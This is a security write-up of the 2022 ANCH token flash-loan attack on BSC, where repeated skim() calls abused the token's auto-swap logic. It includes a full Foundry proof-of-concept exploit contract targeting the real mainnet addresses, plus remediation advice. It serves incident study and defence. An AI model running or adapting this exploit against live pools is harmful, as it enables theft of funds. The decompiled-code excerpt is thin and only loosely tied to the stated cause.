# ANCH — Flash Loan skim() Repeated Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-08-09 |
| **Protocol** | ANCH Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Address unconfirmed (USDT drained) |
| **Attacker** | Address unconfirmed |
| **Vulnerable Contract (ANCH Token)** | [0xA4f5d4aFd6b9226b3004dD276A9F778EB75f2e9e](https://bscscan.com/address/0xA4f5d4aFd6b9226b3004dD276A9F778EB75f2e9e) |
| **ANCH/USDT LP** | [0xaD0dA05b9C20fa541012eE2e89AC99A864CC68Bb](https://bscscan.com/address/0xaD0dA05b9C20fa541012eE2e89AC99A864CC68Bb) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **DODO Flash Loan** | [0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f](https://bscscan.com/address/0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f) |
| **PancakeSwap Router** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **Root Cause** | Manipulation of the auto-swap mechanism triggered during ANCH token transfers via repeated `skim()` calls |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-08/ANCH_exp.sol) |

---
## 1. Vulnerability Overview

The ANCH token had a built-in mechanism (`buyANCH`/`sellANCH`) that automatically swaps with USDT on every transfer. The attacker flash-borrowed 50,000 USDT from DODO, used it to purchase a large amount of ANCH, then transferred ANCH tokens to the LP pool and called the `skim()` function more than 60 times in a loop. `skim()` is a Uniswap V2-style pool function that withdraws any excess when the actual balance exceeds the recorded reserves. ANCH's internal logic, interacting with `skim()`, caused balances to accumulate abnormally. The attacker then sold the accumulated ANCH back into USDT to secure a net profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable skim() interaction - ANCH auto-swap mechanism
// Uniswap V2 standard skim()
function skim(address to) external {
    // Actual balance - recorded reserve = excess
    uint256 excess0 = IERC20(token0).balanceOf(address(this)) - reserve0;
    uint256 excess1 = IERC20(token1).balanceOf(address(this)) - reserve1;
    // Transfer excess to the `to` address
    IERC20(token0).transfer(to, excess0);
    IERC20(token1).transfer(to, excess1);
}

// ❌ ANCH's problem: buyANCH/sellANCH auto-executes on every transfer
// Every time skim() transfers ANCH, the internal swap mechanism is triggered
// This mechanism continuously creates a discrepancy between balance and reserve
// → Repeated skim() calls accumulate tokens

// ✅ Correct pattern - restrict skim() call frequency or disable auto-swap
modifier noSkimDuringSwap() {
    require(!_inSwap, "Skim not allowed during swap");
    _;
}
```

---
### On-Chain Source Code

Source: Bytecode decompiled


**ANCH_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: Manipulation of auto-swap triggered during ANCH token transfers via repeated `skim()` calls
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ Unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] DODO.flashLoan(50,000 USDT)
    │       └─ Enter DPPFlashLoanCall() callback
    │
    ├─[2] buyANCH() → Buy large amount of ANCH with USDT
    │
    ├─[3] Transfer ANCH tokens to LP pool
    │
    ├─[4] pair.skim() × 60+ repeated calls
    │       └─ On each call:
    │           ├─ ANCH auto-swap mechanism triggered
    │           └─ Balance/reserve discrepancy created → excess accumulates
    │
    ├─[5] sellANCH() → Sell accumulated ANCH for USDT
    │
    ├─[6] Repay 50,000 USDT flash loan
    │
    └─[7] Net profit secured
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUni_Pair_V2 {
    function skim(address) external;
}

interface IUni_Router_V2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256, uint256, address[] calldata, address, uint256
    ) external;
}

interface DVM {
    function flashLoan(uint256, uint256, address, bytes calldata) external;
}

contract ANCHExploit is Test {
    IERC20 ANCH = IERC20(0xA4f5d4aFd6b9226b3004dD276A9F778EB75f2e9e);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IUni_Pair_V2 pair = IUni_Pair_V2(0xaD0dA05b9C20fa541012eE2e89AC99A864CC68Bb);
    IUni_Router_V2 router = IUni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    DVM dodo = DVM(0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f);

    function setUp() public {
        vm.createSelectFork("bsc", 20_302_534);
        USDT.approve(address(router), type(uint256).max);
        ANCH.approve(address(router), type(uint256).max);
    }

    function testExploit() public {
        // [Step 1] Borrow 50,000 USDT via DODO flash loan
        dodo.flashLoan(0, 50_000 * 1e18, address(this), abi.encode("exploit"));
        emit log_named_decimal_uint("[End] USDT balance", USDT.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address, uint256, uint256 baseAmount, bytes calldata) external {
        // [Step 2] Buy ANCH with USDT
        buyANCH();

        // [Step 3] Transfer ANCH to LP pool
        ANCH.transfer(address(pair), ANCH.balanceOf(address(this)));

        // [Step 4] Repeat skim() 60+ times → exploit balance/reserve discrepancy
        for (uint256 i = 0; i < 60; i++) {
            pair.skim(address(this)); // ⚡ Each call triggers ANCH internal mechanism
        }

        // [Step 5] Sell accumulated ANCH back for USDT
        sellANCH();

        // [Step 6] Repay flash loan
        USDT.transfer(address(dodo), baseAmount);
    }

    function buyANCH() internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(ANCH);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            USDT.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function sellANCH() internal {
        address[] memory path = new address[](2);
        path[0] = address(ANCH);
        path[1] = address(USDT);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ANCH.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Business Logic Flaw |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | AMM skim() function abuse |
| **Attack Vector** | Token auto-swap mechanism + repeated skim() calls |
| **Preconditions** | Fee-on-transfer token, no restriction on skim() call frequency |
| **Impact** | USDT drained (scale unconfirmed) |

---
## 6. Remediation Recommendations

1. **Disable auto-swap during `skim()` calls**: Set an `_inSwap` flag to prevent internal swaps from being triggered while `skim()` is executing.
2. **Restrict `skim()` access**: Limit `skim()` calls to `onlyOwner` or whitelisted addresses only.
3. **Redesign the auto-swap mechanism**: A mechanism that automatically interacts with an external DEX on every token transfer creates complex attack vectors. At a minimum, reentrancy protection and rate limiting must be applied.

---
## 7. Lessons Learned

- **Interaction between `skim()` and automatic mechanisms**: Uniswap V2's `skim()` function is safe with standard tokens, but tokens that have side effects on transfer (fee-on-transfer, auto-swap, etc.) can trigger unexpected behavior.
- **Repeated-call vulnerability**: A gain that is negligible in a single call can become a significant loss when repeated 60 or more times. State-changing functions that can be called repeatedly require rate limiting.